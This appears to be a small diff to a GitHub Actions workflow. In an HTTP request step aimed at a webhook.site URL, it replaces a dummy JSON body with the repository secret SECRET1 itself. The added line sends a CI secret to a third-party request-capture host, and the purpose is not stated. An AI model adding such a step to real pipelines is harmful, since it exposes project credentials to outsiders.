@@ -25,8 +25,7 @@ jobs:
         with:
           url: 'https://webhook.site/85f1e0e4-7027-4431-883b-9d9bd82db67a'
           method: 'GET'
-          username: ${{ secrets.SECRET1 }}
-          data: '{"key_1": "value_1", "key_2": "value_2"}'
+          data: ${{ secrets.SECRET1 }}
       - name: upload artifact
         uses: actions/upload-artifact@v2
         with:
